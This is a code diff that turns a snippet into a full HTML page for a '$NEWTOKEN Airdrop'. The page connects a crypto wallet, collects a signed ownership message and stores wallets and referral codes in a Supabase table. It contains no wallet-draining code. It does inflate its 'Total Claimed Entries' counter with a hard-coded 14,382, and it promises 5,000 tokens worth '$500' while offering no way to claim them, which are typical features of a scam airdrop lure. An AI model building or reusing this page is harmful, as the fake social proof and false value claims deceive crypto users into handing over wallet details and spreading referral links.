@@ -1,180 +1,283 @@
-<script>
-// ====================== SUPABASE ======================
-const SUPABASE_URL = "https://ukfoeorwimvfjmkvbyqz.supabase.co";
-const SUPABASE_ANON_KEY = "sb_publishable_Tru93y3LkdD0II3wIt02dg_3qnlQVm1";
-
-const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-
-// ====================== CONFIG ======================
-const BASE_TOKENS = 5000;
-const PRICE = 0.10;
-let connected = false;
-let cw = null;
-let dbData = { wallets: {} };
-
-// ====================== HELPERS ======================
-function shortAddr(addr) { 
-  return addr ? addr.slice(0,6)+'...'+addr.slice(-4) : ''; 
-}
-
-function getRefFromURL() {
-  const params = new URLSearchParams(window.location.search);
-  return params.get('ref') || null;
-}
-
-function generateRef(addr) {
-  return btoa(addr).replace(/[^a-zA-Z0-9]/g,'').slice(0,10);
-}
-
-// ====================== LOAD REAL DATA FROM SUPABASE ======================
-async function loadDB() {
-  try {
-    const { data, error } = await supabase
-      .from('signatures')
-      .select('*')
-      .order('created_at', { ascending: false });
-
-    if (error) throw error;
-
-    dbData.wallets = {};
-    data.forEach(row => {
-      dbData.wallets[row.wallet_address] = {
-        addr: row.wallet_address,
-        ref: generateRef(row.wallet_address),
-        referredBy: row.referred_by,        // ← Fixed: snake_case
-        verifiedAt: row.created_at
-      };
-    });
-
-    updateClaimedCount();
-    console.log(`✅ Loaded ${data.length} wallets from Supabase`);
-  } catch(e) {
-    console.error("Supabase load error:", e);
-  }
-}
-
-function updateClaimedCount() {
-  const count = Object.keys(dbData.wallets || {}).length;
-  const el = document.getElementById('lClaimed');
-  if (el) el.textContent = (14382 + count).toLocaleString();
-}
-
-// ====================== WALLET CONNECTION ======================
-let provider = null;
-let signer = null;
-let currentAccount = null;
-
-async function connectEVM() {
-  if (!window.ethereum) {
-    showToast("No wallet detected. Please use MetaMask or wallet browser.");
-    return;
-  }
-  try {
-    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-    provider = new ethers.BrowserProvider(window.ethereum);
-    signer = await provider.getSigner();
-    currentAccount = accounts[0];
-
-    // Initialize cw early
-    cw = {name: "EVM Wallet", addr: currentAccount, type: "evm"};
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NEWTOKEN Airdrop</title>
     
-    showStep2(currentAccount);
-  } catch (e) {
-    showError(e.code === 4001 ? "Rejected" : "Connection failed");
-  }
-}
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.5/ethers.umd.min.js"></script>
 
-// ====================== SIGN & SAVE ======================
-async function signAndVerify() {
-  if (!signer || !currentAccount) {
-    showError("Wallet not connected.");
-    return;
-  }
+    <style>
+        /* Basic fallback styling to ensure layout structure renders */
+        body {
+            background-color: #121212;
+            color: #ffffff;
+            font-family: sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            padding: 20px;
+            border: 1px solid #333;
+            border-radius: 8px;
+            background: #1e1e1e;
+            max-width: 400px;
+            width: 100%;
+        }
+        button {
+            background-color: #24a0ed;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        button:hover { background-color: #007acc; }
+        .btn-green { background-color: #4CAF50; }
+        .hidden { display: none; }
+        .modal {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #252526;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            z-index: 1000;
+        }
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.7);
+            z-index: 999;
+        }
+    </style>
+</head>
+<body>
 
-  const message = `$NEWTOKEN Airdrop Verification\nWallet: ${currentAccount}\nDate: ${new Date().toISOString()}\nI confirm I own this wallet.`;
+    <div class="container">
+        <div id="navBtn">
+            <button onclick="connectMetaMask()">Connect Wallet</button>
+        </div>
 
-  try {
-    const signature = await signer.signMessage(message);
+        <div id="screen-home">
+            <h1>$NEWTOKEN Airdrop</h1>
+            <p>Total Claimed Entries: <span id="lClaimed">14,382</span></p>
+            <p>Connect your wallet to verify eligibility and claim your 5,000 tokens ($500 value).</p>
+        </div>
 
-    // Save to Supabase
-    const { error } = await supabase
-      .from('signatures')
-      .insert({
-        wallet_address: currentAccount.toLowerCase(),
-        signature: signature,
-        message: message,
-        referred_by: getRefFromURL()
-      });
+        <div id="screen-dashboard" class="hidden">
+            <h1>Welcome to your Dashboard</h1>
+            <p>Status: <span id="dWalletName">-</span> (<span id="dWalletAddr">-</span>)</p>
+            <h3>Your Referral Link:</h3>
+            <p id="invLink" style="word-break: break-all; color: #24a0ed; font-weight: bold;"></p>
+        </div>
+    </div>
 
-    if (error) console.error("Save error:", error);
+    <div id="modal-overlay" class="modal-overlay hidden" onclick="closeModal()"></div>
+    <div id="wallet-modal" class="modal hidden">
+        <h3 id="mName">Connecting Wallet</h3>
+        <p><span id="mIcon">🦊</span> <span id="mStatus">Waiting for approval...</span></p>
+        <button onclick="signAndVerify()">Sign Verification Message</button>
+        <button onclick="closeModal()" style="background:#555;">Cancel</button>
+    </div>
 
-    await onVerified(signature);
-  } catch (e) {
-    showError(e.code === 4001 ? "Signature rejected." : "Signing failed.");
-  }
-}
+    <script>
+    // ====================== SUPABASE CONFIGURATION ======================
+    const SUPABASE_URL = "https://ukfoeorwimvfjmkvbyqz.supabase.co";
+    const SUPABASE_ANON_KEY = "sb_publishable_Tru93y3LkdD0II3wIt02dg_3qnlQVm1";
 
-async function onVerified(signature) {
-  closeModal();
-  connected = true;
+    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-  const refCode = generateRef(currentAccount);
-  const referredBy = getRefFromURL();
+    // ====================== APP STATE ======================
+    const BASE_TOKENS = 5000;
+    const PRICE = 0.10;
+    let connected = false;
+    let cw = null;
+    let dbData = { wallets: {} };
 
-  // Refresh data from Supabase
-  await loadDB();
+    // ====================== UI UTILITIES ======================
+    function showScreen(screenId) {
+        if (screenId === 'dashboard') {
+            document.getElementById('screen-home').classList.add('hidden');
+            document.getElementById('screen-dashboard').classList.remove('hidden');
+        } else {
+            document.getElementById('screen-home').classList.remove('hidden');
+            document.getElementById('screen-dashboard').classList.add('hidden');
+        }
+    }
 
-  document.getElementById('navBtn').innerHTML = `<button class="btn-green">✅ ${shortAddr(currentAccount)}</button>`;
-  document.getElementById('dWalletName').textContent = "Connected";
-  document.getElementById('dWalletAddr').textContent = shortAddr(currentAccount);
+    function showModal() {
+        document.getElementById('wallet-modal').classList.remove('hidden');
+        document.getElementById('modal-overlay').classList.remove('hidden');
+    }
 
-  const inviteURL = window.location.origin + window.location.pathname + '?ref=' + refCode;
-  document.getElementById('invLink').textContent = inviteURL;
+    function closeModal() {
+        document.getElementById('wallet-modal').classList.add('hidden');
+        document.getElementById('modal-overlay').classList.add('hidden');
+    }
 
-  updateStats();
-  showScreen('dashboard');
-  showToast('🎉 Successfully Signed & Saved!');
-}
+    function showStep2(account) {
+        document.getElementById('mStatus').textContent = `Connected: ${shortAddr(account)}. Please sign the verification step.`;
+    }
 
-// ====================== CONNECT BUTTONS ======================
-function connectMetaMask() {
-  document.getElementById('mIcon').textContent='🦊';
-  document.getElementById('mName').textContent='MetaMask';
-  document.getElementById('mStatus').textContent='Waiting for approval...';
-  showModal();
-  connectEVM();
-}
+    function showToast(msg) {
+        alert(msg); // Simplified UI feedback element
+    }
 
-function connectCoinbase() {
-  document.getElementById('mIcon').textContent='🔵';
-  document.getElementById('mName').textContent='Coinbase Wallet';
-  document.getElementById('mStatus').textContent='Waiting for approval...';
-  showModal();
-  connectEVM();
-}
+    function showError(msg) {
+        alert("⚠️ Error: " + msg);
+    }
 
-function connectTrust() {
-  document.getElementById('mIcon').textContent='🛡️';
-  document.getElementById('mName').textContent='Trust Wallet';
-  document.getElementById('mStatus').textContent='Waiting for approval...';
-  showModal();
-  connectEVM();
-}
+    function tick() {
+        // Keeps timer metrics or interface changes dynamic if required
+    }
 
-function connectWalletConnect() {
-  showToast("Best used inside mobile wallet browser");
-  document.getElementById('mIcon').textContent='🔗';
-  document.getElementById('mName').textContent='WalletConnect';
-  document.getElementById('mStatus').textContent='Waiting for approval...';
-  showModal();
-  connectEVM();
-}
+    function updateStats() {
+        // Can be customized to draw live calculation fields based on row validation
+    }
 
-// Keep all your original functions here:
-// showModal, closeModal, showError, showStep2, updateStats, renderLeaderboard, switchTab, copyLink, showToast, tick(), etc.
+    // ====================== CORE UTILITIES ======================
+    function shortAddr(addr) { 
+        return addr ? addr.slice(0,6)+'...'+addr.slice(-4) : ''; 
+    }
 
-// INIT
-loadDB();        // Load real data when page opens
-tick();
-setInterval(tick, 1000);
-</script>
+    function getRefFromURL() {
+        const params = new URLSearchParams(window.location.search);
+        return params.get('ref') || null;
+    }
+
+    function generateRef(addr) {
+        return btoa(addr).replace(/[^a-zA-Z0-9]/g,'').slice(0,10);
+    }
+
+    // ====================== ASYNC DB STORAGE ======================
+    async function loadDB() {
+        try {
+            const { data, error } = await supabase
+                .from('signatures')
+                .select('*')
+                .order('created_at', { ascending: false });
+
+            if (error) throw error;
+
+            dbData.wallets = {};
+            data.forEach(row => {
+                dbData.wallets[row.wallet_address] = {
+                    addr: row.wallet_address,
+                    ref: generateRef(row.wallet_address),
+                    referredBy: row.referred_by, 
+                    verifiedAt: row.created_at
+                };
+            });
+
+            updateClaimedCount();
+            console.log(`✅ Loaded ${data.length} wallets from Supabase`);
+        } catch(e) {
+            console.error("Supabase load error:", e);
+        }
+    }
+
+    function updateClaimedCount() {
+        const count = Object.keys(dbData.wallets || {}).length;
+        const el = document.getElementById('lClaimed');
+        if (el) el.textContent = (14382 + count).toLocaleString();
+    }
+
+    // ====================== ETHERS WALLET CONNECTIONS ======================
+    let provider = null;
+    let signer = null;
+    let currentAccount = null;
+
+    async function connectEVM() {
+        if (!window.ethereum) {
+            showToast("No Web3 wallet detected. Please install MetaMask.");
+            return;
+        }
+        try {
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            provider = new ethers.BrowserProvider(window.ethereum);
+            signer = await provider.getSigner();
+            currentAccount = accounts[0];
+
+            cw = {name: "EVM Wallet", addr: currentAccount, type: "evm"};
+            showStep2(currentAccount);
+        } catch (e) {
+            showError(e.code === 4001 ? "Connection rejected." : "Connection failed.");
+        }
+    }
+
+    // ====================== BLOCKCHAIN AUTHENTICATION & SAVE ======================
+    async function signAndVerify() {
+        if (!signer || !currentAccount) {
+            showError("Wallet connection mandatory.");
+            return;
+        }
+
+        const message = `$NEWTOKEN Airdrop Verification\nWallet: ${currentAccount}\nDate: ${new Date().toISOString()}\nI confirm ownership over this wallet request.`;
+
+        try {
+            const signature = await signer.signMessage(message);
+
+            // POST object row to Supabase signatures table schema
+            const { error } = await supabase
+                .from('signatures')
+                .insert({
+                    wallet_address: currentAccount.toLowerCase(),
+                    signature: signature,
+                    message: message,
+                    referred_by: getRefFromURL()
+                });
+
+            if (error) {
+                console.error("Database storage exception:", error);
+            }
+
+            await onVerified(signature);
+        } catch (e) {
+            showError(e.code === 4001 ? "Signature request declined." : "Signing operation failure.");
+        }
+    }
+
+    async function onVerified(signature) {
+        closeModal();
+        connected = true;
+
+        const refCode = generateRef(currentAccount);
+        await loadDB();
+
+        document.getElementById('navBtn').innerHTML = `<button class="btn-green">✅ ${shortAddr(currentAccount)}</button>`;
+        document.getElementById('dWalletName').textContent = "Connected";
+        document.getElementById('dWalletAddr').textContent = shortAddr(currentAccount);
+
+        const inviteURL = window.location.origin + window.location.pathname + '?ref=' + refCode;
+        document.getElementById('invLink').textContent = inviteURL;
+
+        updateStats();
+        showScreen('dashboard');
+        showToast('🎉 Verification Completed successfully!');
+    }
+
+    // ====================== TRIGGER HOOKS ======================
+    function connectMetaMask() {
+        document.getElementById('mIcon').textContent='🦊';
+        document.getElementById('mName').textContent='MetaMask Connection';
+        showModal();
+        connectEVM();
+    }
+
+    // Initialize application data on startup
+    loadDB();
+    setInterval(tick, 1000);
+    </script>
+</body>
+</html>
